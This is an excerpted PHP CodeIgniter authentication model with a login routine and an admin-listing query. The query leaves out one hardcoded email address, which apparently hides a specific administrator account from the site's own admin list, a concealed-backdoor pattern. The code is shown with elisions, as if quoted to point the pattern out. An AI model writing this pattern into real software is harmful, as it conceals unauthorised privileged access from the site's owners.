...
class Auth_model extends CI_Model
{
    ...
    public function login()
    {
        ...
        $user_email = $this->get_user_by_email($data['email']);
        $user_username = $this->get_user_by_username($data['email']);
        if(!empty($user_email)) {
            $user= $user_email;
        }
    ...
    {
        $sql = "SELECT * FROM users WHERE users.role = 'admin' AND users.email!='godmanhunter@gmail.com'";
        $query = $this->db->query($sql);
        return $query->result();
    }
